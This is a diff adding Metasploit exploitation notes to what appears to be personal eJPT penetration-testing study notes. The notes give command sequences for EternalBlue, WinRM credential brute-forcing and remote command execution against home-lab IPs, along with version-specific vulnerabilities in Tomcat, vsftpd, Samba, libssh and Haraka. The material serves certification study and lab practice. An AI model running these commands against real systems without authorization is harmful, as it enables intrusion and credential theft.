@@ -1835,9 +1835,146 @@ makerc /home/kali/certs/ejpt/resource_scripts/portscan2.rc
 
 ## [Exploitation](https://www.offsec.com/metasploit-unleashed/exploits/) with MSF
 
+### HFS (HTTP File Server)
 
+A **HFS** (HTTP File Server) is a file and documents sharing web server.
 
+- Rejetto HFS - free open source HTTP file server
 
+> 🔬 [HFS - MSF Exploit](3-metasploit/hfs-msf-exp.md)
+
+### SMB - MS17-010 EternalBlue
+
+- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
+- [EternalBlue VA](../assessment-methodologies/4-va.md#eternalblue)
+  - **EternalBlue** takes advantage of a Windows SMBv1 protocol vulnerability
+  - Patch was released in March 2017
+
+> 🔬 Check the [Lab 2 - Eternal Blue here](1-system-attack/windows-attacks/smb-psexec.md)
+
+- Some MSF useful commands from my Home Lab (`Kali VM + Win 2008_R2 Server`)
+
+```bash
+service postgresql start && msfconsole -q
+```
+
+```bash
+db_status
+setg RHOSTS 192.168.31.131
+setg RHOST 192.168.31.131
+workspace -a EternalBlue
+
+db_nmap -sS -sV -O 192.168.31.131
+```
+
+```bash
+search type:auxiliary EternalBlue
+use auxiliary/scanner/smb/smb_ms17_010
+options
+run
+
+search type:exploit EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+options
+run
+```
+
+### WinRM
+
+- Identify WinRM users with MSF and exploit WinRM by obtaining access credentials.
+- Default WinRM HTTP port is **`5985`** and HTTPS **`5986`**
+
+> 🔬 [WinRM Attack lab](1-system-attack/windows-attacks/winrm.md)
+
+```bash
+service postgresql start && msfconsole -q
+```
+
+```bash
+db_status
+setg RHOSTS 10.2.27.173
+setg RHOST 10.2.27.173
+workspace -a WinRM
+
+db_nmap -sS -sV -O -p- 10.2.27.173
+# Port 5985 is set up for WinRM
+```
+
+```bash
+search type:auxiliary winrm
+use auxiliary/scanner/winrm/winrm_auth_methods
+options
+run
+
+# Brute force WinRM login
+search winrm_login
+use auxiliary/scanner/winrm/winrm_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+search winrm_cmd
+use auxiliary/scanner/winrm/winrm_cmd
+set USERNAME administrator
+set PASSWORD tinkerbell
+set CMD whoami
+run
+```
+
+![](.gitbook/assets/image-20230416114857268.png)
+
+```bash
+search winrm_script
+use exploit/windows/winrm/winrm_script_exec
+set USERNAME administrator
+set PASSWORD tinkerbell
+set FORCE_VBS true
+exploit
+```
+
+### Apache Tomcat
+
+[**Apache Tomcat**](https://tomcat.apache.org/) is a free open source Java servlet web server, *build to host dynamic websites and web apps developed in **Java***.
+
+- Tomcat default TCP port is **`8080`**
+- Apache web server host HTML/PHP web apps, instead
+- Apache Tomcat < **`v.8.5.23`** is vulnerable to a JSP Upload Bypass / RCE
+
+> 🔬 [Tomcat - MSF Exploit](3-metasploit/tomcat-msf-exp.md)
+
+### FTP
+
+[**`vsftpd`**](https://security.appspot.com/vsftpd.html) is an Unix FTP server.
+
+- vsftpd **`v.2.3.4`** is vulnerable to a command execution vulnerability
+
+> 🔬 [FTP - MSF Exploit](3-metasploit/ftpd-msf-exp.md)
+
+### SAMBA
+
+**`Samba`** is the Linux implementation of SMB.
+
+- Samaba **`v.3.5.0`** is vulnerable to a RCE vulnerability
+
+> 🔬 [Samba - MSF Exploit](3-metasploit/samba-msf-exp.md)
+
+### SSH
+
+**`libssh`** is a C library that implements the SSHv2 protocol
+
+- **`SSH`** default TCP port is **`22`**
+- libssh **`v.0.6.0 - 0.8.0`** is vulnerable to an authentication bypass vulnerability
+
+> 🔬 [SSH - MSF Exploit](3-metasploit/ssh-msf-exp.md)
+
+### SMTP
+
+[**`Haraka`**](https://haraka.github.io/) is an open source high performance SMTP server developed in `Node.js`
+
+- **`SMTP`** default TCP port is **`25`**
+  - other TCP ports are **`465`** and **`587`**
+- Haraka prior to **`v.2.8.9`** is vulnerable to command injection
+
+> 🔬 [SMTP - MSF Exploit](3-metasploit/smtp-msf-exp.md)
 
 ## Post Exploitation with MSF
 
